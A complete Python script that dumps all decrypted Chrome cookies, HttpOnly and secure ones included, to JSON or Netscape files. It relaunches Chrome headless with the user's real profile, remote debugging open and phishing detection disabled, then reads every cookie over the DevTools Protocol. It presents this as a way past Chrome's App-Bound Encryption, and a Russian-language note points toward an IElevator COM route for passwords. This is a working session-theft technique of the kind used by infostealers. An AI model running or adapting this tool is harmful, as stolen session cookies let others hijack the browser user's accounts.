#!/usr/bin/env python3
"""
CDP Cookie Extractor for Chrome 127+ (ABE)
Automatically extracts decrypted cookies via Chrome DevTools Protocol.

This is the ONLY reliable method for Chrome 144+ with App-Bound Encryption.

Usage:
    python cdp_cookie_extractor.py

Requirements:
    pip install websocket-client
"""

import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path
from typing import List, Dict, Optional, Tuple
import tempfile
import shutil

DEBUG_PORT = 9222

def find_chrome() -> Optional[Path]:
    """Find Chrome executable."""
    paths = [
        Path(os.environ.get("PROGRAMFILES", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
        Path(os.environ.get("PROGRAMFILES(X86)", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
    ]
    for p in paths:
        if p.exists():
            return p
    return None

def get_chrome_user_data() -> Optional[Path]:
    """Get Chrome User Data directory."""
    path = Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data"
    return path if path.exists() else None

def kill_chrome():
    """Kill all Chrome processes."""
    print("[*] Closing Chrome...")
    try:
        subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], 
                      capture_output=True, timeout=10)
        time.sleep(2)
    except Exception as e:
        print(f"    Warning: {e}")

def is_chrome_running() -> bool:
    """Check if Chrome is running."""
    try:
        result = subprocess.run(["tasklist", "/FI", "IMAGENAME eq chrome.exe"],
                               capture_output=True, text=True, timeout=5)
        return "chrome.exe" in result.stdout.lower()
    except Exception:
        return False

def is_debug_port_open() -> bool:
    """Check if debug port is responding."""
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{DEBUG_PORT}/json/version", timeout=2)
        return True
    except Exception:
        return False

def start_chrome_debug(chrome_path: Path, user_data: Path) -> subprocess.Popen:
    """Start Chrome with remote debugging enabled."""
    print(f"[*] Starting Chrome with debug port {DEBUG_PORT}...")
    
    # Create a temporary profile to avoid conflicts
    temp_dir = Path(tempfile.mkdtemp(prefix="chrome_cdp_"))
    
    args = [
        str(chrome_path),
        f"--remote-debugging-port={DEBUG_PORT}",
        f"--user-data-dir={user_data}",  # Use original profile to get cookies
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-background-networking",
        "--disable-client-side-phishing-detection",
        "--disable-default-apps",
        "--disable-extensions",
        "--disable-hang-monitor",
        "--disable-popup-blocking",
        "--disable-prompt-on-repost",
        "--disable-sync",
        "--disable-translate",
        "--metrics-recording-only",
        "--safebrowsing-disable-auto-update",
        "--headless=new",  # Run headless (invisible)
    ]
    
    process = subprocess.Popen(args, 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
    
    # Wait for debug port to be available
    for _ in range(30):
        if is_debug_port_open():
            print("[+] Chrome debug port is ready!")
            return process
        time.sleep(0.5)
    
    print("[-] Timeout waiting for Chrome debug port")
    return process

def get_cdp_targets() -> List[Dict]:
    """Get available CDP targets."""
    try:
        response = urllib.request.urlopen(f"http://127.0.0.1:{DEBUG_PORT}/json", timeout=5)
        return json.loads(response.read())
    except Exception as e:
        print(f"[-] Failed to get CDP targets: {e}")
        return []

def get_cookies_via_cdp() -> Tuple[bool, List[Dict]]:
    """Extract all cookies via CDP WebSocket."""
    try:
        import websocket
    except ImportError:
        print("[-] websocket-client not installed!")
        print("    Run: pip install websocket-client")
        return False, []
    
    targets = get_cdp_targets()
    if not targets:
        return False, []
    
    # Find a suitable target (prefer page targets)
    ws_url = None
    for target in targets:
        if target.get("type") == "page":
            ws_url = target.get("webSocketDebuggerUrl")
            break
    
    if not ws_url:
        # Fallback to browser target
        try:
            response = urllib.request.urlopen(
                f"http://127.0.0.1:{DEBUG_PORT}/json/version", timeout=5)
            version_info = json.loads(response.read())
            ws_url = version_info.get("webSocketDebuggerUrl")
        except Exception:
            pass
    
    if not ws_url:
        print("[-] No WebSocket URL found")
        return False, []
    
    print(f"[*] Connecting to CDP: {ws_url[:50]}...")
    
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        
        # Get all cookies
        ws.send(json.dumps({
            "id": 1,
            "method": "Network.getAllCookies"
        }))
        
        response = json.loads(ws.recv())
        ws.close()
        
        if "result" in response and "cookies" in response["result"]:
            cookies = response["result"]["cookies"]
            return True, cookies
        else:
            print(f"[-] Unexpected response: {response}")
            return False, []
            
    except Exception as e:
        print(f"[-] CDP error: {e}")
        return False, []

def get_passwords_note():
    """Note about password extraction."""
    return """
╔════════════════════════════════════════════════════════════════╗
║  ⚠️  ВАЖНО: Пароли нельзя извлечь через CDP!                   ║
║                                                                 ║
║  Chrome НЕ предоставляет пароли через DevTools Protocol.       ║
║  Для паролей нужен IElevator COM или другой метод.             ║
║                                                                 ║
║  CDP может извлечь только:                                      ║
║  ✓ Cookies (уже расшифрованные)                                ║
║  ✓ LocalStorage                                                 ║
║  ✓ SessionStorage                                               ║
╚════════════════════════════════════════════════════════════════╝
"""

def format_cookie_for_export(cookie: Dict) -> Dict:
    """Format cookie for Netscape/JSON export."""
    return {
        "domain": cookie.get("domain", ""),
        "name": cookie.get("name", ""),
        "value": cookie.get("value", ""),
        "path": cookie.get("path", "/"),
        "expires": cookie.get("expires", -1),
        "httpOnly": cookie.get("httpOnly", False),
        "secure": cookie.get("secure", False),
        "sameSite": cookie.get("sameSite", "None"),
    }

def export_cookies_json(cookies: List[Dict], output_path: str):
    """Export cookies to JSON file."""
    formatted = [format_cookie_for_export(c) for c in cookies]
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(formatted, f, indent=2, ensure_ascii=False)
    print(f"[+] Saved {len(cookies)} cookies to: {output_path}")

def export_cookies_netscape(cookies: List[Dict], output_path: str):
    """Export cookies to Netscape format (for curl, wget, etc.)."""
    lines = ["# Netscape HTTP Cookie File", "# https://curl.se/docs/http-cookies.html", ""]
    
    for c in cookies:
        # Format: domain, include_subdomains, path, secure, expires, name, value
        domain = c.get("domain", "")
        include_subdomains = "TRUE" if domain.startswith(".") else "FALSE"
        path = c.get("path", "/")
        secure = "TRUE" if c.get("secure") else "FALSE"
        expires = int(c.get("expires", 0)) if c.get("expires", -1) > 0 else 0
        name = c.get("name", "")
        value = c.get("value", "")
        
        lines.append(f"{domain}\t{include_subdomains}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
    
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"[+] Saved {len(cookies)} cookies to: {output_path}")

def main():
    print("=" * 60)
    print("  CDP Cookie Extractor for Chrome 144+ (ABE)")
    print("=" * 60)
    print()
    
    # Check for websocket-client
    try:
        import websocket
    except ImportError:
        print("[-] ERROR: websocket-client not installed!")
        print("    Run: pip install websocket-client")
        return 1
    
    # Find Chrome
    chrome_path = find_chrome()
    if not chrome_path:
        print("[-] Chrome not found!")
        return 1
    print(f"[+] Chrome: {chrome_path}")
    
    user_data = get_chrome_user_data()
    if not user_data:
        print("[-] Chrome User Data not found!")
        return 1
    print(f"[+] User Data: {user_data}")
    
    # Check if Chrome is already running with debug port
    if is_debug_port_open():
        print("[+] Chrome debug port already available!")
        process = None
    else:
        # Need to start Chrome with debug port
        if is_chrome_running():
            print("[!] Chrome is running without debug port.")
            response = input("    Close Chrome and restart with debug? (y/n): ")
            if response.lower() != 'y':
                print("[-] Aborted. Please close Chrome manually and run:")
                print(f'    "{chrome_path}" --remote-debugging-port={DEBUG_PORT}')
                return 1
            kill_chrome()
        
        process = start_chrome_debug(chrome_path, user_data)
    
    # Extract cookies
    print()
    print("[*] Extracting cookies via CDP...")
    success, cookies = get_cookies_via_cdp()
    
    if process:
        print("[*] Closing headless Chrome...")
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
    
    if not success:
        print("[-] Failed to extract cookies!")
        return 1
    
    print()
    print("=" * 60)
    print(f"  ✅ SUCCESS! Extracted {len(cookies)} cookies")
    print("=" * 60)
    
    # Statistics
    domains = set(c.get("domain", "") for c in cookies)
    print(f"\n[*] Statistics:")
    print(f"    Total cookies: {len(cookies)}")
    print(f"    Unique domains: {len(domains)}")
    print(f"    Secure cookies: {sum(1 for c in cookies if c.get('secure'))}")
    print(f"    HttpOnly cookies: {sum(1 for c in cookies if c.get('httpOnly'))}")
    
    # Show sample cookies
    print(f"\n[*] Sample cookies (first 5):")
    for c in cookies[:5]:
        domain = c.get("domain", "")
        name = c.get("name", "")
        value = c.get("value", "")[:30] + "..." if len(c.get("value", "")) > 30 else c.get("value", "")
        print(f"    {domain}: {name} = {value}")
    
    # Export options
    print("\n[*] Export options:")
    print("    1. JSON format (cookies.json)")
    print("    2. Netscape format (cookies.txt)")
    print("    3. Both formats")
    print("    4. Skip export")
    
    choice = input("\n    Choose (1-4): ").strip()
    
    output_dir = Path.cwd()
    
    if choice == "1" or choice == "3":
        export_cookies_json(cookies, str(output_dir / "cookies.json"))
    
    if choice == "2" or choice == "3":
        export_cookies_netscape(cookies, str(output_dir / "cookies.txt"))
    
    # Note about passwords
    print(get_passwords_note())
    
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\nAborted.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
